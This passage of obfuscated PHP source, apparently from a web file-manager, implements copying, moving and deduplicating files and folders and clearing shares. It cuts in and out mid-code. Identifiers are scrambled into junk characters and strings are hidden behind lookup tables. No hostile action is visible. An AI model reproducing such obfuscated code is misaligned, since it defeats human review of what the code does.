!$¯¥ÔÄûß[$³“Ôáû[586]]) { $¯¥ÔÄûß[$³“Ôáû[586]] = !0; } return $ØœÏ ¬Ÿ; } private function _moveForce($İÌõœÙÄ, $°ÇèÈŸî, $ÑÌºİ¶„) { $‘ºÃıÀ =& $_SERVER[¥ÙÌÜ¾ê]; $˜ãûÏÛ‹ = $this->sourceInfo($İÌõœÙÄ); $’„³è = $this->sourceInfo($°ÇèÈŸî); $˜º¡ÈËç = $˜ãûÏÛ‹[$‘ºÃıÀ[405]] == $‘ºÃıÀ[87]; $»²ñÏ¹† = array($‘ºÃıÀ[396] => $’„³è[$‘ºÃıÀ[397]], $‘ºÃıÀ[578] => $’„³è[$‘ºÃıÀ[515]] . $’„³è[$‘ºÃıÀ[397]] . $‘ºÃıÀ[47], $‘ºÃıÀ[574] => $’„³è[$‘ºÃıÀ[406]], $‘ºÃıÀ[575] => $’„³è[$‘ºÃıÀ[498]], $‘ºÃıÀ[577] => USER_ID, $‘ºÃıÀ[415] => $ÑÌºİ¶„); $¥ßü½° = $˜ãûÏÛ‹[$‘ºÃıÀ[406]] == SourceModel::TYPE_GROUP && $’„³è[$‘ºÃıÀ[406]] == SourceModel::TYPE_GROUP && $˜ãûÏÛ‹[$‘ºÃıÀ[498]] == $’„³è[$‘ºÃıÀ[498]]; if (!$¥ßü½° && $this->moveClearAuth) { Model($‘ºÃıÀ[496])->authClear($İÌõœÙÄ); } $Çà¹å² = $˜ãûÏÛ‹[$‘ºÃıÀ[425]] == $‘ºÃıÀ[87] && $’„³è[$‘ºÃıÀ[425]] != $‘ºÃıÀ[87]; if ($Çà¹å²) { $»²ñÏ¹†[$‘ºÃıÀ[424]] = 0; } if ($˜º¡ÈËç) { $–¹ä¶  = array($‘ºÃıÀ[578] => array($‘ºÃıÀ[538], $˜ãûÏÛ‹[$‘ºÃıÀ[515]] . $˜ãûÏÛ‹[$‘ºÃıÀ[397]] . $‘ºÃıÀ[539])); $ú‹‘ŸÀ• = $˜ãûÏÛ‹[$‘ºÃıÀ[515]] . $˜ãûÏÛ‹[$‘ºÃıÀ[397]] . $‘ºÃıÀ[47]; $Š‚€ÑÌî = $’„³è[$‘ºÃıÀ[515]] . $’„³è[$‘ºÃıÀ[397]] . $‘ºÃıÀ[47] . $˜ãûÏÛ‹[$‘ºÃıÀ[397]] . $‘ºÃıÀ[47]; $í³ÁÆáØ = array($‘ºÃıÀ[578] => array($‘ºÃıÀ[587], "\x72\145\x70\154\x61\143\x65\x28\160\x61\x72\145\156\164\x4c\145\166\x65\154\54\x27{$ú‹‘ŸÀ•}\x27\54\x27{$Š‚€ÑÌî}\x27\x29"), $‘ºÃıÀ[574] => $’„³è[$‘ºÃıÀ[406]], $‘ºÃıÀ[575] => $’„³è[$‘ºÃıÀ[498]]); if ($Çà¹å²) { $í³ÁÆáØ[$‘ºÃıÀ[424]] = 0; } $this->where($–¹ä¶ )->data($í³ÁÆáØ)->save(); } $this->where(array($‘ºÃıÀ[412] => $İÌõœÙÄ))->data($»²ñÏ¹†)->save(); return $İÌõœÙÄ; } private function clearShare($±ª¥–îØ, $»êÜÉ¬Â) { $ÅÂúì” =& $_SERVER[¥ÙÌÜ¾ê]; $‰¾“½Ñ = $this->sourceInfo($±ª¥–îØ); $ıŞúóÃ = $this->sourceInfo($»êÜÉ¬Â); if ($‰¾“½Ñ[$ÅÂúì”[498]] == $ıŞúóÃ[$ÅÂúì”[498]] && $‰¾“½Ñ[$ÅÂúì”[406]] == $ÅÂúì”[588]) { return; } $˜º‚â» = array($ÅÂúì”[515] => array($ÅÂúì”[538], $‰¾“½Ñ[$ÅÂúì”[515]] . $±ª¥–îØ . $ÅÂúì”[539])); $ª¥é¢¹÷ = $this->field($ÅÂúì”[412])->where($˜º‚â»)->getField($ÅÂúì”[397], !0); if (!$ª¥é¢¹÷) { return; } $˜º‚â» = array($ÅÂúì”[397] => array($ÅÂúì”[7], $ª¥é¢¹÷), $ÅÂúì”[489] => 1); $§¤µè½¡ = Model($ÅÂúì”[589])->field($ÅÂúì”[482])->where($˜º‚â»)->select(); if (!$§¤µè½¡) { return; } $§¤µè½¡ = array_to_keyvalue($§¤µè½¡, $ÅÂúì”[33], $ÅÂúì”[482]); $˜º‚â» = array($ÅÂúì”[482] => array($ÅÂúì”[7], $§¤µè½¡)); Model($ÅÂúì”[589])->where($˜º‚â»)->save(array($ÅÂúì”[489] => 0)); Model($ÅÂúì”[590])->where($˜º‚â»)->delete(); } public function copyFolderFromIO($Ò´äñôœ, $Íë‚˜å…, $¥›ÃŠ, $´Ï×ã·©, $‰ÇÂ—™Æ, $î”›÷¾í = false) { $¹‰ÃÍ¢– =& $_SERVER[¥ÙÌÜ¾ê]; $úê±ê· = array($¹‰ÃÍ¢–[555] => array(), $¹‰ÃÍ¢–[556] => array(), $¹‰ÃÍ¢–[554] => array(), $¹‰ÃÍ¢–[591] => array()); $è²£î•â = $î”›÷¾í ? $î”›÷¾í : $Ò´äñôœ->pathThis($Íë‚˜å…); $•¦ÁáìŞ = $this->fileNameExist($¥›ÃŠ, $è²£î•â); $ÖÍ½‡Ê = $this->mkdir($¥›ÃŠ, $è²£î•â, $´Ï×ã·©); if (!$•¦ÁáìŞ || $´Ï×ã·© == REPEAT_RENAME_FOLDER) { $´Ï×ã·© = !1; } if ($•¦ÁáìŞ) { $this->_childrenAllMake($•¦ÁáìŞ); } Hook::trigger($¹‰ÃÍ¢–[592]); $this->_copyChildTo($Ò´äñôœ, $Íë‚˜å…, $ÖÍ½‡Ê, $´Ï×ã·©, $úê±ê·, $‰ÇÂ—™Æ); Hook::trigger($¹‰ÃÍ¢–[593]); if ($ÖÍ½‡Ê) { $this->folderSizeResetChildren($ÖÍ½‡Ê); } $this->_childrenListClear(); Model($¹‰ÃÍ¢–[557])->addAll($úê±ê·[$¹‰ÃÍ¢–[555]], array(), !0); Model($¹‰ÃÍ¢–[558])->eventCopy($ÖÍ½‡Ê); $this->saveAll($úê±ê·[$¹‰ÃÍ¢–[556]]); Model($¹‰ÃÍ¢–[464])->linkAdd($úê±ê·[$¹‰ÃÍ¢–[554]]); Model($¹‰ÃÍ¢–[464])->remove($úê±ê·[$¹‰ÃÍ¢–[591]]); $this->folderSizeReset($¥›ÃŠ); $this->updateModifyTime($¥›ÃŠ); return $ÖÍ½‡Ê; } private function _copyChildTo($Ÿ‚êöì…, $ìöÅô´õ, $©•˜îô¥, $Œ¹ü‚Õˆ, &$Œ¹“Èğ½, $öàåıİ•) { $ŸõÑášü =& $_SERVER[¥ÙÌÜ¾ê]; $ı—ÚÛÒŒ = $this->sourceInfoCache($©•˜îô¥); $Úè¤¯ûÊ = $Ÿ‚êöì…->listPath($ìöÅô´õ); $Úè¤¯ûÊ = $Úè¤¯ûÊ ? $Úè¤¯ûÊ : array($ŸõÑášü[74] => array(), $ŸõÑášü[75] => array()); $‹èœ™Õ = array_merge($Úè¤¯ûÊ[$ŸõÑášü[74]], $Úè¤¯ûÊ[$ŸõÑášü[75]]); $Ãö®Äå = $this->_addFiles($Ÿ‚êöì…, $Úè¤¯ûÊ[$ŸõÑášü[74]], $öàåıİ•); $Úãóì„ = array(); foreach ($‹èœ™Õ as &$à¶ƒ¼í) { if (isset($Ãö®Äå[$à¶ƒ¼í[$ŸõÑášü[28]]])) { $à¶ƒ¼í = $Ãö®Äå[$à¶ƒ¼í[$ŸõÑášü[28]]]; } $à¶ƒ¼í[$ŸõÑášü[405]] = $à¶ƒ¼í[$ŸõÑášü[29]] == $ŸõÑášü[77]; $à¶ƒ¼í[$ŸõÑášü[407]] = _get($à¶ƒ¼í, $ŸõÑášü[168], $ŸõÑášü[33]); $à¶ƒ¼í[$ŸõÑášü[78]] = _get($à¶ƒ¼í, $ŸõÑášü[78], 0); $à¶ƒ¼í[$ŸõÑášü[461]] = _get($à¶ƒ¼í, $ŸõÑášü[461], 0); if (!isset($à¶ƒ¼í[$ŸõÑášü[594]]) && $à¶ƒ¼í[$ŸõÑášü[461]]) { $Œ¹“Èğ½[$ŸõÑášü[591]][] = $à¶ƒ¼í[$ŸõÑášü[461]]; } if ($Œ¹ü‚Õˆ) { $éÀóä«é = $this->fileNameExistCache($©•˜îô¥, $à¶ƒ¼í[$ŸõÑášü[28]]); if ($éÀóä«é) { if ($à¶ƒ¼í[$ŸõÑášü[405]] || $Œ¹ü‚Õˆ == REPEAT_SKIP) { continue; } if ($Œ¹ü‚Õˆ == REPEAT_REPLACE) { $ÚİîŒ¢š = $this->sourceInfoCache($éÀóä«é); $ÑËÎí = $this->fileHistory($ÚİîŒ¢š, $à¶ƒ¼í[$ŸõÑášü[461]], $à¶ƒ¼í[$ŸõÑášü[78]]); if ($ÑËÎí) { $Œ¹“Èğ½[$ŸõÑášü[554]][] = $à¶ƒ¼í[$ŸõÑášü[461]]; } continue; } else { if ($Œ¹ü‚Õˆ == REPEAT_RENAME) { $à¶ƒ¼í[$ŸõÑášü[28]] = $this->fileNameAutoCache($©•˜îô¥, $à¶ƒ¼í[$ŸõÑášü[28]], $Œ¹ü‚Õˆ, !1); } } } } if (!$à¶ƒ¼í[$ŸõÑášü[405]] && $à¶ƒ¼í[$ŸõÑášü[461]]) { $Œ¹“Èğ½[$ŸõÑášü[554]][] = $à¶ƒ¼í[$ŸõÑášü[461]]; } $Úãóì„[] = $this->_makeItemData($à¶ƒ¼í, $ı—ÚÛÒŒ, $à¶ƒ¼í[$ŸõÑášü[28]]); } unset($à¶ƒ¼í); if (!empty($Úãóì„)) { $this->addAll($Úãóì„); $this->_childrenListSelect($©•˜îô¥); } $ƒõ´˜¡Ê = $this->_childrenList($©•˜îô¥); $ƒõ´˜¡Ê = array_to_keyvalue($ƒõ´˜¡Ê, $ŸõÑášü[28]); foreach ($‹èœ™Õ as $à¶ƒ¼í) { $ÚİîŒ¢š = $ƒõ´˜¡Ê[$à¶ƒ¼í[$ŸõÑášü[28]]]; $‘ñËØ» = $ÚİîŒ¢š[$ŸõÑášü[397]]; $this->_copyApplyMeta($ÚİîŒ¢š, $Œ¹“Èğ½); if ($à¶ƒ¼í[$ŸõÑášü[29]] == $ŸõÑášü[77]) { $à¶ƒ¼í[$ŸõÑášü[76]] = $Ÿ‚êöì…->getPathInner($à¶ƒ¼í[$ŸõÑášü[76]]); $this->_copyChildTo($Ÿ‚êöì…, $à¶ƒ¼í[$ŸõÑášü[76]], $‘ñËØ», $Œ¹ü‚Õˆ, $Œ¹“Èğ½, $öàåıİ•); } } } private function _addFiles($ —åŠ–ı, $‘„Õƒ«, $ä€©µÂŞ) { $™ÀÕ“å¸ =& $_SERVER[¥ÙÌÜ¾ê]; if (!$‘„Õƒ« || count($‘„Õƒ«) == 0) { return array(); } $‡æßº«ê = array(); foreach ($‘„Õƒ« as &$æÙÈƒ¥ƒ) { Hook::trigger($™ÀÕ“å¸[595], $æÙÈƒ¥ƒ); $æÙÈƒ¥ƒ[$™ÀÕ“å¸[76]] = $ —åŠ–ı->getPathInner($æÙÈƒ¥ƒ[$™ÀÕ“å¸[76]]); $°Ì½†Æ¡ = $ —åŠ–ı->hashSimple($æÙÈƒ¥ƒ[$™ÀÕ“å¸[76]]); $îŒĞ•ãè = $ —åŠ–ı->hashMd5($æÙÈƒ¥ƒ[$™ÀÕ“å¸[76]]); if (strlen($îŒĞ•ãè) > 10 && !isset($‡æßº«ê[$îŒĞ•ãè])) { $‡æßº«ê[$îŒĞ•ãè] = array(); } $æÙÈƒ¥ƒ[$™ÀÕ“å¸[171]] = $°Ì½†Æ¡; $æÙÈƒ¥ƒ[$™ÀÕ“å¸[170]] = $îŒĞ•ãè; Hook::trigger($™ÀÕ“å¸[596], $æÙÈƒ¥ƒ); $‡æßº«ê[$îŒĞ•ãè][] =& $æÙÈƒ¥ƒ; if (count($‡æßº«ê[$îŒĞ•ãè]) > 1) { $æÙÈƒ¥ƒ[$™ÀÕ“å¸[594]] = !0; } } unset($æÙÈƒ¥ƒ); $¤•âÜ¸Â = array($™ÀÕ“å¸[170] => array($™ÀÕ“å¸[7], array_keys($‡æßº«ê))); $Íõåé”Ÿ = Model($™ÀÕ“å¸[597]); $ÑáŞï€× = $Íõåé”Ÿ->where($¤•âÜ¸Â)->select(); $ÑáŞï€× = $ÑáŞï€× ? $ÑáŞï€× : array(); foreach ($ÑáŞï€× as $í¤Ÿ€Õ) { if (!isset($‡æßº«ê[$í¤Ÿ€Õ[$™ÀÕ“å¸[170]]])) { continue; } $¤²®Œ©ˆ = $‡æßº«ê[$í¤Ÿ€Õ[$™ÀÕ“å¸[170]]]; foreach ($¤²®Œ©ˆ as &$æÙÈƒ¥ƒ) { $æÙÈƒ¥ƒ[$™ÀÕ“å¸[461]] = $í¤Ÿ€Õ[$™ÀÕ“å¸[461]]; $æÙÈƒ¥ƒ[$™ÀÕ“å¸[594]] = !0; } unset($æÙÈƒ¥ƒ); } $²‚”Ûşà = array(); foreach ($‘„Õƒ« as $§õÚĞå˜) { if (isset($§õÚĞå˜[$™ÀÕ“å¸[594]]) && $§õÚĞå˜[$™ÀÕ“å¸[594]]) { continue; } $—¡»¡Š± = $ —åŠ–ı->getPathInner($§õÚĞå˜[$™ÀÕ“å¸[76]]); $ÏÔ­¬Ùó = $Íõåé”Ÿ->addFileMake($—¡»¡Š±, $§õÚĞå˜[$™ÀÕ“å¸[78]], $§õÚĞå˜[$™ÀÕ“å¸[171]], $§õÚĞå˜[$™ÀÕ“å¸[170]], $§õÚĞå˜[$™ÀÕ“å¸[28]], $ä€©µÂŞ); $²‚”Ûşà[] = $ÏÔ­¬Ùó; } $Íõåé”Ÿ->addAll($²‚”Ûşà); $¤•âÜ¸Â = array($™ÀÕ“å¸[170] => array($™ÀÕ“å¸[7], array_keys($‡æßº«ê))); $ÑáŞï€× = $Íõåé”Ÿ->where($¤•âÜ¸Â)->select(); $ÑáŞï€× = $ÑáŞï€× ? $ÑáŞï€× : array(); foreach ($ÑáŞï€× as $í¤Ÿ€Õ) { if (!isset($‡æßº«ê[$í¤Ÿ€Õ[$™ÀÕ“å¸[170]]])) { continue; } $¬›È‘É =& $‡æßº«ê[$í¤Ÿ€Õ[$™ÀÕ“å¸[170]]]; foreach ($¬›È‘É as &$æÙÈƒ¥ƒ) { $æÙÈƒ¥ƒ[$™ÀÕ“å¸[461]] = $í¤Ÿ€Õ[$™ÀÕ“å¸[461]]; } unset($æÙÈƒ¥ƒ); } $¥úüÒ©¤ = array(); foreach ($‘„Õƒ« as $«¶Öûœ­) { $¥úüÒ©¤[$«¶Öûœ­[$™ÀÕ“å¸[28]]] = $«¶Öûœ­; } return $¥úüÒ©¤; } } goto fæˆƒ±åÏâ; cˆªÚ¥†ùí: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($æã¥ìüà, $¤ÛĞ›¥‰) { $Ş‡ã¬ôÂ =& $_SERVER[¥ÙÌÜ¾ê]; $Ş‡ÎÓ‡Í = $¤ÛĞ›¥‰; $GLOBALS[$Ş‡ã¬ôÂ[1078]] = $Ş‡ã¬ôÂ[1079] . $æã¥ìüà; Hook::trigger($Ş‡ã¬ôÂ[1079] . $æã¥ìüà . $Ş‡ã¬ôÂ[1080], $Ş‡ÎÓ‡Í); $«†°…üù = self::driverMake($¤ÛĞ›¥‰[0]); if (!$«†°…üù) { return !1; } if (method_exists($«†°…üù, $æã¥ìüà)) { $á’éÂ÷ = @call_user_func_array(array($«†°…üù, $æã¥ìüà), $¤ÛĞ›¥‰); } else { if (method_exists($«†°…üù, $Ş‡ã¬ôÂ[1081])) { $á’éÂ÷ = @call_user_func_array(array($«†°…üù, $æã¥ìüà), $¤ÛĞ›¥‰); } else { if (method_exists(self, $æã¥ìüà)) { $á’éÂ÷ = @call_user_func_array(array(self, $æã¥ìüà), $¤ÛĞ›¥‰); } else { $á’éÂ÷ = call_user_func_array(array(parent, $æã¥ìüà), $¤ÛĞ›¥‰); } } } Hook::trigger($Ş‡ã¬ôÂ[1079] . $æã¥ìüà . $Ş‡ã¬ôÂ[1082], $Ş‡ÎÓ‡Í, $á’éÂ÷); return $á’éÂ÷; } public static function init($ô×º÷ÆÅ) { return self::driverMake($ô×º÷ÆÅ); } public static function copy($âÁˆ×˜¢, $’õ¯¥», $Û¡òîşŒ = false, $ØÜ”òÔÇ = false) { return self::copyMoveStart($âÁˆ×˜¢, $’õ¯¥», $Û¡òîşŒ, $_SERVER[¥ÙÌÜ¾ê][543], $ØÜ”òÔÇ); } public static function move($š†Ø”ˆ×, $ÓêÊÛ¥ï, $µÓûñ»ˆ = false, $³ñÊÅï = false) { return self::copyMoveStart($š†Ø”ˆ×, $ÓêÊÛ¥ï, $µÓûñ»ˆ, $_SERVER[¥ÙÌÜ¾ê][545], $³ñÊÅï); } private static function copyMoveStart($Åƒ…ÊÎ€, $»Šà±¾¬, $ÕòôĞĞ², $ÈÄ÷İá¤, $¢…²†É›) { $ƒÆö×¼“ =& $_SERVER[¥ÙÌÜ¾ê]; $¬îäÎÎ = array($Åƒ…ÊÎ€, $»Šà±¾¬, $ÕòôĞĞ², $¢…²†É›); Hook::trigger($ƒÆö×¼“[1079] . $ÈÄ÷İá¤ . $ƒÆö×¼“[1080], $¬îäÎÎ); $ÅÖÛñŠÔ = self::copyMove($Åƒ…ÊÎ€, $»Šà±¾¬, $ÕòôĞĞ², $ÈÄ÷İá¤, $¢…²†É›); Hook::trigger($ƒÆö×¼“[1079] . $ÈÄ÷İá¤ . $ƒÆö×¼“[1082], $¬îäÎÎ, $ÅÖÛñŠÔ); return $ÅÖÛñŠÔ; } public static function saveFile($¼™ŠÜıû, $˜¸¥Õ®Ê, $¼‘ãè¤­ = true) { $ŞÂÕÉùË =& $_SERVER[¥ÙÌÜ¾ê]; $Õí¨ = self::info($˜¸¥Õ®Ê); $ƒÜëêÀÌ = self::driverMake($¼™ŠÜıû); $˜¶Ø”ˆÄ = self::driverMake($˜¸¥Õ®Ê); $š¹úÔÖ = !1; if ($˜¶Ø”ˆÄ->pathParse[$ŞÂÕÉùË[1083]]) { $š¹úÔÖ = $˜¶Ø”ˆÄ; $ğÍ’Ù§Ù = $˜¶Ø”ˆÄ->pathParse[$ŞÂÕÉùË[1083]]; $˜¶Ø”ˆÄ = self::driverMake($ğÍ’Ù§Ù); } if ($ƒÜëêÀÌ->pathParse[$ŞÂÕÉùË[1083]]) { $æÕÄŞŠÛ = $ƒÜëêÀÌ->pathParse[$ŞÂÕÉùË[1083]]; $ƒÜëêÀÌ = self::driverMake($æÕÄŞŠÛ); } $’ˆ°˜¢ë = $˜¶Ø”ˆÄ->pathFather($˜¸¥Õ®Ê); $şË¾ŞÅ× = !0; if (!$¼‘ãè¤­ && self::driverIsSame($ƒÜëêÀÌ, $˜¶Ø”ˆÄ)) { $şË¾ŞÅ× = !1; } $óœİäÓé = self::copyFile($ƒÜëêÀÌ, $¼™ŠÜıû, $˜¶Ø”ˆÄ, $’ˆ°˜¢ë, $Õí¨[$ŞÂÕÉùË[28]], $şË¾ŞÅ×); if ($š¹úÔÖ) { $óœİäÓé = $š¹úÔÖ->getPathOuter($óœİäÓé); } return $óœİäÓé; } private static function copyMove($ü°·Üµ¾, $Ş´¦¢æ¼, $”²ÕÀÕ¬, $ßèÅ¼ÑÖ, $õÕıˆØ€ = false) { $‡†¤ë˜ =& $_SERVER[¥ÙÌÜ¾ê]; if (!$ü°·Üµ¾ || $ü°·Üµ¾ == $‡†¤ë˜[8] || !$Ş´¦¢æ¼) { return !1; } ignore_timeout(); $ÒŸÒà™ = self::driverMake($ü°·Üµ¾); $Õ¸¬ÑÏ = self::driverMake($Ş´¦¢æ¼); $ú® –îæ = $ßèÅ¼ÑÖ == $‡†¤ë˜[545]; $ß•ı·êª = !1; if ($Õ¸¬ÑÏ->pathParse[$‡†¤ë˜[1083]]) { $ß•ı·êª = $Õ¸¬ÑÏ; $Ş´¦¢æ¼ = $Õ¸¬ÑÏ->pathParse[$‡†¤ë˜[1083]]; $Õ¸¬ÑÏ = self::driverMake($Ş´¦¢æ¼); } if ($ÒŸÒà™->pathParse[$‡†¤ë˜[1083]]) { $ü°·Üµ¾ = $ÒŸÒà™->pathParse[$‡†¤ë˜[1083]]; $ÒŸÒà™ = self::driverMake($ü°·Üµ¾); } self::check($ÒŸÒà™, $ü°·Üµ¾, $Õ¸¬ÑÏ, $Ş´¦¢æ¼); Hook::trigger($‡†¤ë˜[73], $ÒŸÒà™, $ü°·Üµ¾, $Õ¸¬ÑÏ, $Ş´¦¢æ¼); $İˆˆÄë· = self::driverIsSame($ÒŸÒà™, $Õ¸¬ÑÏ); if ($İˆˆÄë·) { if ($ßèÅ¼ÑÖ == $‡†¤ë˜[545] && !method_exists($Õ¸¬ÑÏ, $‡†¤ë˜[1084]) && trim($Ş´¦¢æ¼, $‡†¤ë˜[8]) == trim($Õ¸¬ÑÏ->pathFather($ü°·Üµ¾), $‡†¤ë˜[8])) { if ($ÒŸÒà™->pathThis($ü°·Üµ¾) != $õÕıˆØ€ && !$ÒŸÒà™->isTypeObject()) { return $ÒŸÒà™->rename($ü°·Üµ¾, $õÕıˆØ€); } return $Õ¸¬ÑÏ->getPathOuter($ü°·Üµ¾); } if (method_exists($Õ¸¬ÑÏ, $ßèÅ¼ÑÖ)) { return $Õ¸¬ÑÏ->{$ßèÅ¼ÑÖ}($ü°·Üµ¾, $Ş´¦¢æ¼, $”²ÕÀÕ¬, $õÕıˆØ€); } } if ($İˆˆÄë· && $ßèÅ¼ÑÖ == $‡†¤ë˜[545] && $Õ¸¬ÑÏ->getType() == $‡†¤ë˜[106]) { $÷şôÉ‹¨ = $Õ¸¬ÑÏ->movePath($ü°·Üµ¾, $Ş´¦¢æ¼, $õÕıˆØ€); if ($÷şôÉ‹¨) { return $÷şôÉ‹¨; } } $áÅùï—ï = $ÒŸÒà™->isFile($ü°·Üµ¾); if (!$áÅùï—ï && $Õ¸¬ÑÏ->getType() == $‡†¤ë˜[751] && $ÒŸÒà™->getType() == $‡†¤ë˜[106]) { $÷şôÉ‹¨ = $Õ¸¬ÑÏ->copyFolderFromIO($ÒŸÒà™, $ü°·Üµ¾, $Ş´¦¢æ¼, $”²ÕÀÕ¬, $ú® –îæ, $õÕıˆØ€); } else { $÷şôÉ‹¨ = self::copyPath($ÒŸÒà™, $ü°·Üµ¾, $Õ¸¬ÑÏ, $Ş´¦¢æ¼, $”²ÕÀÕ¬, $ú® –îæ, $áÅùï—ï, $õÕıˆØ€); } if ($÷şôÉ‹¨ && $ú® –îæ) { $ÒŸÒà™->remove($ü°·Üµ¾); } if ($ß•ı·êª) { $÷şôÉ‹¨ = $ß•ı·êª->getPathOuter($÷şôÉ‹¨); } return $÷şôÉ‹¨; } private static function check($İ•¼Ì›, $¬µÀò², $şÜ˜Á —, &$·°°…») { $¥ç‹ÃâÍ =& $_SERVER[¥ÙÌÜ¾ê]; if (self::driverIsSame($İ•¼Ì›, $şÜ˜Á —) && $İ•¼Ì›->isFolder($¬µÀò²) && $İ•¼Ì›->isParentOf($¬µÀò², $·°°…»)) { show_json(LNG($¥ç‹ÃâÍ[1085]), !1); } if (!$İ•¼Ì›->exist($¬µÀò²)) { show_json(LNG($¥ç‹ÃâÍ[105]), !1); } } private static function copyPath($‚Ï‚——Â, $şßÏ„Ù˜, $…¼•ÂŒ–, $¯ÄÀàìâ, $¨¹ç§ËÅ, $áÒÇÕà›, $“øÎÜº, $ºæ‰Æ³› = false) { $ÈÛ­¦¦ =& $_SERVER[¥ÙÌÜ¾ê]; $ŒÎç›§Î = empty($ºæ‰Æ³›) && $ºæ‰Æ³› !== $ÈÛ­¦¦[191] ? $‚Ï‚——Â->pathThis($şßÏ„Ù˜) : $ºæ‰Æ³›; if ($¨¹ç§ËÅ) { $‘¦·ñã‡ = $…¼•ÂŒ–->fileNameExist($¯ÄÀàìâ, $ŒÎç›§Î); $ŒÎç›§Î = $…¼•ÂŒ–->fileNameAuto($¯ÄÀàìâ, $ŒÎç›§Î, $¨¹ç§ËÅ, !$“øÎÜº); $¨¹ç§ËÅ = $‘¦·ñã‡ ? $¨¹ç§ËÅ : !1; } if ($“øÎÜº) { return self::copyFile($‚Ï‚——Â, $şßÏ„Ù˜, $…¼•ÂŒ–, $¯ÄÀàìâ, $ŒÎç›§Î, $áÒÇÕà›); } if ($¨¹ç§ËÅ == REPEAT_RENAME_FOLDER) { $¨¹ç§ËÅ = !1; } $Ë«â¯—á = rtrim($¯ÄÀàìâ, $ÈÛ­¦¦[8]) . $ÈÛ­¦¦[8] . $ŒÎç›§Î; $æı„²Å = $…¼•ÂŒ–->mkdir($…¼•ÂŒ–->getPath($Ë«â¯—á)); $¯ÄÀàìâ = $…¼•ÂŒ–->getPathInner($æı„²Å); $×ÖşÒÎ€ = $‚Ï‚——Â->listPath($şßÏ„Ù˜, !0); $×ÖşÒÎ€ = is_array($×ÖşÒÎ€) ? $×ÖşÒÎ€ : array($ÈÛ­¦¦[74] => array(), $ÈÛ­¦¦[75] => array()); $€€ƒ±ÚÌ = array_merge($×ÖşÒÎ€[$ÈÛ­¦¦[74]], $×ÖşÒÎ€[$ÈÛ­¦¦[75]]); foreach ($€€ƒ±ÚÌ as $Æ´ÕÈÚÁ) { $«¥úÏÄ = $Æ´ÕÈÚÁ[$ÈÛ­¦¦[29]] == $ÈÛ­¦¦[193]; $şßÏ„Ù˜ = $‚Ï‚——Â->getPathInner($Æ´ÕÈÚÁ[$ÈÛ­¦¦[76]]); $­É™ä = self::copyPath($‚Ï‚——Â, $şßÏ„Ù˜, $…¼•ÂŒ–, $¯ÄÀàìâ, $¨¹ç§ËÅ, $áÒÇÕà›, $«¥úÏÄ); if (!$­É™ä) { IO::errorTips($ÈÛ­¦¦[1086] . $şßÏ„Ù˜ . $ÈÛ­¦¦[67] . $¯ÄÀàìâ); } } self::copyMoveKeepInfo($‚Ï‚——Â, $şßÏ„Ù˜, $æı„²Å); return $æı„²Å; } private static function copyFile($ŸÂ÷»á¸, $üíŒèÂñ, $óìÆõê, $æ¨Âéä–, $÷£æº½Ø, $Ã¤İ ŠÒ) { $¬›‰ëéã =& $_SERVER[¥ÙÌÜ¾ê]; $æ¨Âéä– = $óìÆõê->getPath(rtrim($æ¨Âéä–, $¬›‰ëéã[8]) . $¬›‰ëéã[8] . $÷£æº½Ø); $¬Ôœµíé = $¬›‰ëéã[1087] . time() . rand_string(5); Hook::trigger($¬›‰ëéã[1088], $ŸÂ÷»á¸, $üíŒèÂñ, $óìÆõê, $æ¨Âéä–, $÷£æº½Ø, $¬Ôœµíé); if (self::driverIsSame($ŸÂ÷»á¸, $óìÆõê)) { if ($Ã¤İ ŠÒ) { $àæ“âÔ‹ = $óìÆõê->moveFile($üíŒèÂñ, $æ¨Âéä–); } else { $àæ“âÔ‹ = $óìÆõê->copyFile($üíŒèÂñ, $æ¨Âéä–); } Hook::trigger($¬›‰ëéã[1089], $ŸÂ÷»á¸, $üíŒèÂñ, $óìÆõê, $æ¨Âéä–, $÷£æº½Ø, $àæ“âÔ‹); self::copyMoveKeepInfo($ŸÂ÷»á¸, $üíŒèÂñ, $àæ“âÔ‹); return $àæ“âÔ‹; } $€£¶¹ = TEMP_FILES; if ($GLOBALS[$¬›‰ëéã[6]][$¬›‰ëéã[88]][$¬›‰ëéã[795]]) { $€£¶¹ = $GLOBALS[$¬›‰ëéã[6]][$¬›‰ëéã[88]][$¬›‰ëéã[795]]; } $˜ê®ÎÄÅ = $€£¶¹; mk_dir($˜ê®ÎÄÅ); $’«èÆ‰‹ = $˜ê®ÎÄÅ . $¬Ôœµíé; $íÅÁÊëœ = $’«èÆ‰‹; $’«èÆ‰‹ = $ŸÂ÷»á¸->download($üíŒèÂñ, $’«èÆ‰‹); $’«èÆ‰‹ = $ŸÂ÷»á¸->iconvApp($’«èÆ‰‹); if (substr($’«èÆ‰‹, strlen($€£¶¹)) == $€£¶¹) { $Ã¤İ ŠÒ = !0; } $àæ“âÔ‹ = $óìÆõê->upload($æ¨Âéä–, $’«èÆ‰‹, $Ã¤İ ŠÒ); self::remove($íÅÁÊëœ); Hook::trigger($¬›‰ëéã[1089], $ŸÂ÷»á¸, $üíŒèÂñ, $óìÆõê, $æ¨Âéä–, $÷£æº½Ø, $àæ“âÔ‹); self::copyMoveKeepInfo($ŸÂ÷»á¸, $üíŒèÂñ, $àæ“âÔ‹); return $àæ“âÔ‹; } private static function copyMoveKeepInfo($í²Âò¿î, $•­«ö¡, $½Îñ›Éµ) { if (!$½Îñ›Éµ) { return; } $‚âíİí° = $í²Âò¿î->info($•­«ö¡); if (!is_array($‚âíİí°)) { return; } IO::setModifyTime($½Îñ›Éµ, $‚âíİí°[$_SERVER[¥ÙÌÜ¾ê][84]]); } public static function pathFather($’¯Èñâ) { $Ş‡’ø  = IO::init($’¯Èñâ); $ûùº›¬ = $Ş‡’ø ->pathFather($Ş‡’ø ->path); return $Ş‡’ø ->getPathOuter($ûùº›¬); } public static function fileOut($áãş®Õ¬, $§ÍšÕÑÌ = false, $„¬›ª ÷ = false, $ò³€ÅË = '') { $éüÌ·Èã = self::driverMake($áãş®Õ¬); if ($éüÌ·Èã->isFileOutServer()) { return $éüÌ·Èã->fileOutServer($áãş®Õ¬, $§ÍšÕÑÌ, $„¬›ª ÷, $ò³€ÅË); } return $éüÌ·Èã->fileOut($áãş®Õ¬, $§ÍšÕÑÌ, $„¬›ª ÷, $ò³€ÅË); } public static function fileOutImage($¯ˆüö¿¬, $¿¼½Œìš = 250) { $ñŞâùËİ = array(250, 600, 1200, 2000, 3000, 5000); for ($à¢šŞù£ = 0; $à¢šŞù£ < count($ñŞâùËİ); $à¢šŞù£++) { if ($à¢šŞù£ == 0 && $¿¼½Œìš <= 